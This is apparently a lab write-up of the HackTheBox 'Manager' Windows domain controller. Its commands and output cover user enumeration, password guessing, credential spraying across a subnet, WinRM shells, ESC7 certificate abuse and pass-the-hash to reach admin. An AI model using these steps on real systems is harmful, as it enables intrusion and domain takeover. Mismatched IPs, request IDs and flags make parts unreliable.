---
title: HackTheBox - Manager
date: 2023-10-27 13:23:22
tags: [htb, manager, ctf, writeup, kerbrute, impacket-mssqlclient, ldap, windows, mssql, smb, crackmapexec, winrm, evil-winrm, certipy, dc, rdate]
category: writeups
description: ctf writeup for htb manager
---

# Tools

- nmap
- kerbrute
- impacket-mssqlclient
- crackmapexec
- impacket-smbclient
- evil-winrm
- certipy
- rdate

<br>

## Getting User

### Nmap

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ sudo nmap -sS -sV -oA nmap/initial_scan 10.129.46.174
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 03:40 EDT
Nmap scan report for 10.129.52.108
Host is up (0.28s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-22 14:40:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.25 seconds
{% endvimhl %}

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ sudo nmap -sC -sV -oA nmap/default_script -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269 10.129.46.174
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 04:19 EDT
Nmap scan report for 10.129.52.108
Host is up (0.27s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-22 15:19:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T15:20:31+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T15:20:32+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-10-22T15:20:31+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-22T14:36:44
|_Not valid after:  2053-10-22T14:36:44
| ms-sql-ntlm-info: 
|   10.129.52.108:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.52.108:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T15:20:31+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T15:20:32+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2023-10-22T15:19:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m45s, deviation: 0s, median: 6h59m45s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.58 seconds
{% endvimhl %}

<br>

### Foothold

added domain to *manager.htb* to */etc/hosts*

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ echo "10.129.46.174 manager.htb" | sudo tee -a /etc/hosts
10.129.46.174 manager.htb
{% endvimhl %}

<br>
Looking for a way to enumerate ldap usernames I found kerbrute

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/kerbrute/dist]
└─$ ./kerbrute_linux_amd64 userenum --dc 10.129.46.174 -d manager.htb /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt 
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
Version: dev (9cfb81e) - 10/23/23 - Ronnie Flathers @ropnop
2023/10/23 17:17:17 >  Using KDC(s):
2023/10/23 17:17:17 >   10.129.52.194:88
2023/10/23 17:17:34 >  [+] VALID USERNAME:       ryan@manager.htb
2023/10/23 17:18:01 >  [+] VALID USERNAME:       guest@manager.htb
2023/10/23 17:18:19 >  [+] VALID USERNAME:       cheng@manager.htb
2023/10/23 17:18:28 >  [+] VALID USERNAME:       raven@manager.htb
2023/10/23 17:19:49 >  [+] VALID USERNAME:       administrator@manager.htb
2023/10/23 17:22:30 >  [+] VALID USERNAME:       Ryan@manager.htb
2023/10/23 17:22:57 >  [+] VALID USERNAME:       Raven@manager.htb
2023/10/23 17:24:22 >  [+] VALID USERNAME:       operator@manager.htb
2023/10/23 17:35:46 >  [+] VALID USERNAME:       Guest@manager.htb
2023/10/23 17:35:48 >  [+] VALID USERNAME:       Administrator@manager.htb
2023/10/23 17:44:27 >  [+] VALID USERNAME:       Cheng@manager.htb
2023/10/23 17:45:30 >  [!] prober@manager.htb - failed to communicate with KDC. Attempts made with UDP (error sending to a KDC: error sneding to 10.129.52.194:88: sending over UDP failed to 10.129.52.194:88: read udp 10.10.14.62:48205->10.129.52.194:88: i/o timeout) and then TCP (error in getting a TCP connection to any of the KDCs)
{% endvimhl %}

<br>
By guessing passwords I found that operator's user password is operator and used impacket-mssqlclient tool to connect to mssql server

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager] 
└─$ impacket-mssqlclient -p 1433 -windows-auth -dc-ip manager.htb "manager.htb/operator:operator"@manager.htb
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
{% endvimhl %}

<br>
file traversing using the xp_dirtree command, i found an archive in wwwroot folder

{% vimhl bash %}
SQL (MANAGER\Operator  guest@msdb)> xp_dirtree \inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1
{% endvimhl %}

<br>
I downloaded the file and extracted it

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ wget http://manager.htb/website-backup-27-07-23-old.zip

┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ unzip website-backup-27-07-23-old.zip.1 -d website-backup
{% endvimhl %}

<br>
listed files using -a option which displays files starting with . and we see .old-conf.xml which contains a user's credentials

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files/website-backup]
└─$ ls -lah
total 68K
drwxr-xr-x 5 kali kali 4.0K Oct 24 19:45 .
drwxr-xr-x 3 kali kali 4.0K Oct 24 19:45 ..
-rw-r--r-- 1 kali kali 5.3K Jul 27 05:32 about.html
-rw-r--r-- 1 kali kali 5.2K Jul 27 05:32 contact.html
drwxr-xr-x 2 kali kali 4.0K Oct 24 19:45 css
drwxr-xr-x 2 kali kali 4.0K Oct 24 19:45 images
-rw-r--r-- 1 kali kali  18K Jul 27 05:32 index.html
drwxr-xr-x 2 kali kali 4.0K Oct 24 19:45 js
-rw-r--r-- 1 kali kali  698 Jul 27 05:35 .old-conf.xml
-rw-r--r-- 1 kali kali 7.8K Jul 27 05:32 service.html

┌──(kali㉿kali)-[~/HTB/Manager/files/website-backup]
└─$ cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
{% endvimhl %}

<br>

used **crackmapexec smb** using the credentials we got and found the following

{% vimhl bash %}
┌──(kali㉿kali)-[~/Tools]
└─$ crackmapexec smb 10.129.46.174/24 -u "raven" -p "R4v3nBe5tD3veloP3r\!123"
SMB         10.129.46.173   445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.129.46.157   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.46.137   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.46.145   445    SERVMON          [*] Windows 10.0 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.129.46.151   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.46.161   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.46.171   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.46.174   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.46.173   445    BASTION          [+] Bastion\raven:R4v3nBe5tD3veloP3r!123 
SMB         10.129.46.157   445    DC01             [+] rebound.htb\raven:R4v3nBe5tD3veloP3r!123 
SMB         10.129.46.137   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\raven:R4v3nBe5tD3veloP3r!123 STATUS_LOGON_FAILURE 
SMB         10.129.46.145   445    SERVMON          [-] ServMon\raven:R4v3nBe5tD3veloP3r!123 STATUS_LOGON_FAILURE 
SMB         10.129.46.151   445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
SMB         10.129.46.161   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\raven:R4v3nBe5tD3veloP3r!123 STATUS_LOGON_FAILURE 
SMB         10.129.46.171   445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
SMB         10.129.46.174   445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
{% endvimhl %}

<br>
found new shares and connected to them using impacket-smbclient but found nothing

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ impacket-smbclient BASTION/raven:R4v3nBe5tD3veloP3r\!123@10.129.46.173
.....
{% endvimhl %}

<br>

**crackmapexec winrm** got pwns on 3 ips

{% vimhl bash %}
┌──(kali㉿kali)-[~/Tools]
└─$ crackmapexec winrm 10.129.46.174/24 -u "raven" -p "R4v3nBe5tD3veloP3r\!123"
SMB         10.129.46.157   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:rebound.htb)
SMB         10.129.46.173   5985   BASTION          [*] Windows 10.0 Build 14393 (name:BASTION) (domain:Bastion)
HTTP        10.129.46.173   5985   BASTION          [*] http://10.129.46.173:5985/wsman
HTTP        10.129.46.157   5985   DC01             [*] http://10.129.46.157:5985/wsman
SMB         10.129.46.137   5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
SMB         10.129.46.151   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
SMB         10.129.46.174   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.129.46.137   5985   SAUNA            [*] http://10.129.46.137:5985/wsman
HTTP        10.129.46.151   5985   DC01             [*] http://10.129.46.151:5985/wsman
HTTP        10.129.46.174   5985   DC01             [*] http://10.129.46.174:5985/wsman
SMB         10.129.46.171   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.129.46.171   5985   DC01             [*] http://10.129.46.171:5985/wsman
SMB         10.129.46.161   5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
HTTP        10.129.46.161   5985   SAUNA            [*] http://10.129.46.161:5985/wsman
WINRM       10.129.46.173   5985   BASTION          [-] Bastion\raven:R4v3nBe5tD3veloP3r!123
WINRM       10.129.46.157   5985   DC01             [-] rebound.htb\raven:R4v3nBe5tD3veloP3r!123
WINRM       10.129.46.137   5985   SAUNA            [-] EGOTISTICAL-BANK.LOCAL\raven:R4v3nBe5tD3veloP3r!123
WINRM       10.129.46.151   5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
WINRM       10.129.46.174   5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
WINRM       10.129.46.171   5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
WINRM       10.129.46.161   5985   SAUNA            [-] EGOTISTICAL-BANK.LOCAL\raven:R4v3nBe5tD3veloP3r!123
{% endvimhl %}

<br>
got a connection using evil-winrm on the pwned ips. there was different flags in all the ips but the correct one was in the original ip which was 10.129.46.174

{% vimhl bash %}
┌──(kali㉿kali)-[~/Tools]
└─$ evil-winrm -i 10.129.46.174 -u raven -p "R4v3nBe5tD3veloP3r\!123"           
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents>
{% endvimhl %}

{% vimhl bash %}
*Evil-WinRM* PS C:\Users\Raven\Documents> ls
cd ..*Evil-WinRM* PS C:\Users\Raven\Documents> cd ..
cd Desktop
*Evil-WinRM* PS C:\Users\Raven> cd Desktop
*Evil-WinRM* PS C:\Users\Raven\Desktop> cat user.txt
28661b3d56b2c90b5bb2c43e0aa*****
{% endvimhl %}

<br>

## Getting Root

### Information Gathering

Find a certificate template we can abuse to get admin

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad find -u raven -p R4v3nBe5tD3veloP3r\!123 -dc-ip 10.129.46.174 -stdout   
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
{% endvimhl %}
we see a possible vulnerability **ESC7**

<br>
and this CA template

{% vimhl bash %}
  15
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : manager-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : MANAGER.HTB\Enterprise Admins
        Write Owner Principals          : MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        Write Dacl Principals           : MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        Write Property Principals       : MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
{% endvimhl %}

<br>

### Privilege Escalation

grant yourself Manage Certificates access by adding your user as officer

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad ca -add-officer raven -ca 'manager-DC01-CA' -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -dc-ip 10.129.46.174 
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
{% endvimhl %}

<br>
enable the SubCA template

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad ca -ca 'manager-DC01-CA' -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -enable-template 'SubCA' -dc-ip 10.129.46.174 
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
{% endvimhl %}

<br>
now we can request a certificate based on the SubCA template. It will be denied but we'll save the private key.

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad req -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -template 'SubCA' -target manager.htb -upn administrator@manager.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 24
Would you like to save the private key? (y/N) y
[*] Saved private key to 24.key
[-] Failed to request certificate
{% endvimhl %}

<br>
Trying to issue a request keeps giving us an error?

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad ca -ca 'manager-DC01-CA' -issue-request 24 -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -target manager.htb 
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[-] Got access denied trying to issue certificate
{% endvimhl %}

<br>
and doing all the commands at once works for some reason..

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad ca -add-officer raven -ca 'manager-DC01-CA' -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 &&  certipy-ad ca -ca 'manager-DC01-CA' -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -enable-template 'SubCA' && certipy-ad req -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -template 'SubCA' -target manager.htb -upn administrator@manager.htb && certipy-ad ca -ca 'manager-DC01-CA' -issue-request 28 -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 29
Would you like to save the private key? (y/N) y
[*] Saved private key to 29.key
[-] Failed to request certificate
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Successfully issued certificate
{% endvimhl %}

<br>
finally, we can retrieve the issued certificate.

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad req -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -target manager.htb -retrieve 28
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Rerieving certificate with ID 28
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '28.key'
[*] Saved certificate and private key to 'administrator.pfx'
{% endvimhl %}

<br>
Sync kali's time with the DC.

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ sudo rdate -n manager.htb
Sat Oct 28 12:10:43 EDT 2023
{% endvimhl %}

<br>
Now we can get admin's credentials and get the flag

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.46.174                     
Certipy v4.7.0 - by Oliver Lyak (ly4k)
[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

┌──(kali㉿kali)-[~/HTB/Manager/files]
└─$ evil-winrm -i 10.129.46.174 -u administrator -p "aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
893dc1cdea17e61cec7213a1f37*****
{% endvimhl %}